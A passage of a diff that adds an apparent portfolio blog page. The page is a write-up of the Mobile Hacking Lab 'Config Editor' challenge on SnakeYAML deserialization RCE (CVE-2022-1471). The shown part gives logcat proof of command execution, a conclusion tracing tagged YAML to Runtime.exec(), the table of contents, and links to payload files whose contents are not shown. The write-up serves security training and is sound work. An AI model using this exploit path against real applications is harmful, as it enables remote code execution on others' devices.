+04-17 13:36:07.582  1344  1344 I DeviceUnlockedTag: DeviceUnlockedTag.notifyDeviceLockStatusChanged():31 Notify device unlocked.
+04-17 13:36:07.984   566  1803 D AutofillSession: Set the response has expired.
+04-17 13:36:08.399  8960  8960 I RCE_POC : reached</code></pre>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-33.png" alt="Logcat evidence that confirms command execution">
+                        </figure>
+                        <p>That confirms:</p>
+                        <ul>
+                            <li>SnakeYAML accepted the explicit Java tag</li>
+                            <li>the tagged scalar node was mapped into <code>LegacyCommandUtil(String)</code></li>
+                            <li><code>Runtime.getRuntime().exec(...)</code> was reached successfully</li>
+                        </ul>
+
+                        <h2 id="en-conclusion">10. Conclusion</h2>
+                        <p>The root cause of the lab is unsafe SnakeYAML deserialization of attacker-controlled YAML.</p>
+                        <p>The exploitation path is straightforward because the APK contains an ideal local gadget. The attacker only needs to deliver a tagged scalar YAML object to <code>yaml.load(...)</code>, and SnakeYAML does the rest:</p>
+                        <pre><code class="language-text">Untrusted YAML
+-> explicit Java tag
+-> class resolution
+-> constructor invocation
+-> Runtime.exec()</code></pre>
+                        <p>The most important takeaway is that the dangerous part is not merely loading YAML from an external source. The real issue is allowing untrusted YAML to control Java type resolution during deserialization.</p>
+                    </article>
+
+                    <aside class="blog-toc-wrap" aria-label="Table of contents">
+                        <div data-locale-toc="vi" hidden>
+                            <div class="blog-toc-title">Mục lục</div>
+                            <nav class="blog-toc" id="blogTocNavVi">
+                                <a class="toc-link level-1" href="#vi-overview">Tổng quan</a>
+                                <a class="toc-link level-1" href="#vi-cve">1. Bắt đầu từ CVE-2022-1471</a>
+                                <a class="toc-link level-1" href="#vi-recon">2. Dò tìm bề mặt tấn công</a>
+                                <a class="toc-link level-1" href="#vi-root-cause">3. Nguyên nhân gốc</a>
+                                <a class="toc-link level-1" href="#vi-danger">4. Vì sao SnakeYAML nguy hiểm</a>
+                                <a class="toc-link level-1" href="#vi-gadget">5. Gadget riêng của lab</a>
+                                <a class="toc-link level-1" href="#vi-flow">6. Luồng dữ liệu đầu-cuối</a>
+                                <a class="toc-link level-1" href="#vi-script-engine">7. Vì sao không cần ScriptEngineManager</a>
+                                <a class="toc-link level-1" href="#vi-payload">8. Thiết kế payload</a>
+                                <a class="toc-link level-1" href="#vi-validation">9. Xác minh thực tế</a>
+                                <a class="toc-link level-1" href="#vi-conclusion">10. Kết luận</a>
+                            </nav>
+                            <div class="blog-reference">
+                                <div class="blog-toc-title">Tài liệu</div>
+                                <a class="blog-reference-link" href="https://www.mobilehackinglab.com/course/lab-config-editor-rce" target="_blank" rel="noopener noreferrer">Mobile Hacking Lab: Config Editor</a>
+                                <a class="blog-reference-link" href="https://nvd.nist.gov/vuln/detail/CVE-2022-1471" target="_blank" rel="noopener noreferrer">CVE-2022-1471</a>
+                                <a class="blog-reference-link" href="./assets/public/mobile_hacking/payload-check.yml" target="_blank" rel="noopener noreferrer">payload-check.yml</a>
+                                <a class="blog-reference-link" href="./assets/public/mobile_hacking/payload-rce-log.yml" target="_blank" rel="noopener noreferrer">payload-rce-log.yml</a>
+                                <a class="blog-reference-link" href="./assets/public/mobile_hacking/payload-rce.yml" target="_blank" rel="noopener noreferrer">payload-rce.yml</a>
+                            </div>
+                        </div>
+
+                        <div data-locale-toc="en">
+                            <div class="blog-toc-title">Contents</div>
+                            <nav class="blog-toc" id="blogTocNavEn">
+                                <a class="toc-link level-1" href="#en-overview">Overview</a>
+                                <a class="toc-link level-1" href="#en-cve">1. Starting From CVE-2022-1471</a>
+                                <a class="toc-link level-1" href="#en-recon">2. Attack Surface Recon</a>
+                                <a class="toc-link level-1" href="#en-root-cause">3. Root Cause</a>
+                                <a class="toc-link level-1" href="#en-danger">4. Why SnakeYAML Is Dangerous Here</a>
+                                <a class="toc-link level-1" href="#en-gadget">5. The Lab-Specific Gadget</a>
+                                <a class="toc-link level-1" href="#en-flow">6. End-to-End Data Flow</a>
+                                <a class="toc-link level-1" href="#en-script-engine">7. Why Generic ScriptEngineManager Is Not Needed</a>
+                                <a class="toc-link level-1" href="#en-payload">8. Payload Design For This Lab</a>
+                                <a class="toc-link level-1" href="#en-validation">9. Practical Validation</a>
+                                <a class="toc-link level-1" href="#en-conclusion">10. Conclusion</a>
+                            </nav>
+                            <div class="blog-reference">
+                                <div class="blog-toc-title">References</div>
+                                <a class="blog-reference-link" href="https://www.mobilehackinglab.com/course/lab-config-editor-rce" target="_blank" rel="noopener noreferrer">Mobile Hacking Lab: Config Editor</a>
+                                <a class="blog-reference-link" href="https://nvd.nist.gov/vuln/detail/CVE-2022-1471" target="_blank" rel="noopener noreferrer">CVE-2022-1471</a>
+                                <a class="blog-reference-link" href="./assets/public/mobile_hacking/payload-check.yml" target="_blank" rel="noopener noreferrer">payload-check.yml</a>
+                                <a class="blog-reference-link" href="./assets/public/mobile_hacking/payload-rce-log.yml" target="_blank" rel="noopener noreferrer">payload-rce-log.yml</a>
+                                <a class="blog-reference-link" href="./assets/public/mobile_hacking/payload-rce.yml" target="_blank" rel="noopener noreferrer">payload-rce.yml</a>
+                            </div>
+                        </div>
+                    </aside>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="copyright">
+            <div>© 2026 Portfolio by <a href="./index.html">Phan Toan</a></div>
+            <span>|</span>
+            <div class="fillings"><a href="mailto:ptt.hust.dev@gmail.com">ptt.hust.dev@gmail.com</a></div>
+            <span>|</span>
+            <div class="friends"><a href="https://github.com/PhanTheToan" target="_blank" rel="noopener noreferrer">GitHub</a></div>
+        </div>
+    </footer>
+
+    <div class="blog-image-lightbox" id="blogImageLightbox" aria-hidden="true">
+        <button class="lightbox-close" id="blogImageLightboxClose" aria-label="Close image viewer">×</button>
+        <img id="blogImageLightboxImg" src="" alt="">
+        <div class="lightbox-caption" id="blogImageLightboxCaption"></div>
+    </div>
+
+    <script>
+        (function () {
+            const lightbox = document.getElementById("blogImageLightbox");
+            const lightboxImg = document.getElementById("blogImageLightboxImg");
+            const lightboxCaption = document.getElementById("blogImageLightboxCaption");
+            const lightboxClose = document.getElementById("blogImageLightboxClose");
+            const sourceImages = Array.from(document.querySelectorAll(".blog-markdown img"));
+            if (!lightbox || !lightboxImg || !lightboxCaption || !lightboxClose || !sourceImages.length) return;
+
+            const closeLightbox = () => {
+                lightbox.classList.remove("open");
+                lightbox.setAttribute("aria-hidden", "true");
+                document.body.classList.remove("blog-image-no-scroll");
+                lightboxImg.setAttribute("src", "");
+                lightboxImg.setAttribute("alt", "");
+                lightboxCaption.textContent = "";
+            };
+
+            sourceImages.forEach((img) => {
+                img.setAttribute("tabindex", "0");
+                img.setAttribute("role", "button");
+                img.setAttribute("aria-label", (img.getAttribute("alt") || "Image") + " - open full view");
+                img.addEventListener("click", () => {
+                    lightboxImg.setAttribute("src", img.getAttribute("src") || "");
+                    lightboxImg.setAttribute("alt", img.getAttribute("alt") || "Blog image preview");
+                    lightboxCaption.textContent = img.getAttribute("alt") || "";
+                    lightbox.classList.add("open");
+                    lightbox.setAttribute("aria-hidden", "false");
+                    document.body.classList.add("blog-image-no-scroll");
+                });
+                img.addEventListener("keydown", (event) => {
+                    if (event.key !== "Enter" && event.key !== " ") return;
+                    event.preventDefault();
+                    img.click();
+                });
+            });
+
+            lightboxClose.addEventListener("click", closeLightbox);
+            lightbox.addEventListener("click", (event) => {
+                if (event.target === lightbox) closeLightbox();
+            });
+            window.addEventListener("keydown", (event) => {
+                if (event.key === "Escape" && lightbox.classList.contains("open")) closeLightbox();
+            });
+        })();
+    </script>
+    <script>
+        (function () {
+            const localeButtons = Array.from(document.querySelectorAll(".article-locale-btn"));
+            const articlePanels = Array.from(document.querySelectorAll("[data-locale-panel]"));
+            const tocPanels = Array.from(document.querySelectorAll("[data-locale-toc]"));
+            if (!localeButtons.length || !articlePanels.length || !tocPanels.length) return;
+
+            let observer = null;
+
+            const setupToc = (locale) => {
+                if (observer) observer.disconnect();
+
+                const tocPanel = document.querySelector(`[data-locale-toc="${locale}"]`);
+                if (!tocPanel) return;
+
+                const links = Array.from(tocPanel.querySelectorAll(".toc-link"));
+                const sections = links.map((link) => document.querySelector(link.getAttribute("href"))).filter(Boolean);
+                if (!links.length || !sections.length) return;
+
+                const setActive = (id) => {
+                    links.forEach((link) => {
+                        const active = link.getAttribute("href") === `#${id}`;
+                        link.classList.toggle("active", active);
+                    });
+                };
+
+                observer = new IntersectionObserver(
+                    (entries) => {
+                        const visible = entries
+                            .filter((entry) => entry.isIntersecting)
+                            .sort((a, b) => a.boundingClientRect.top - b.boundingClientRect.top)[0];
+                        if (visible && visible.target.id) setActive(visible.target.id);
+                    },
+                    { rootMargin: "-22% 0px -60% 0px", threshold: [0.05, 0.3, 0.6] }
+                );
+
+                sections.forEach((section) => observer.observe(section));
+                setActive(sections[0].id);
+            };
+
+            const setLocale = (locale) => {
+                articlePanels.forEach((panel) => {
+                    panel.hidden = panel.getAttribute("data-locale-panel") !== locale;
+                });
+                tocPanels.forEach((panel) => {
+                    panel.hidden = panel.getAttribute("data-locale-toc") !== locale;
+                });
+                localeButtons.forEach((button) => {
+                    const active = button.getAttribute("data-locale") === locale;
+                    button.classList.toggle("active", active);
+                    button.setAttribute("aria-pressed", active ? "true" : "false");
+                });
+                document.documentElement.lang = locale;
+                setupToc(locale);
+            };
+
+            localeButtons.forEach((button) => {
+                button.addEventListener("click", () => setLocale(button.getAttribute("data-locale")));
+            });
+
+            setLocale("en");
+        })();
+    </script>
+    <script src="./js/main.min.js"></script>
+</body>
+</html>
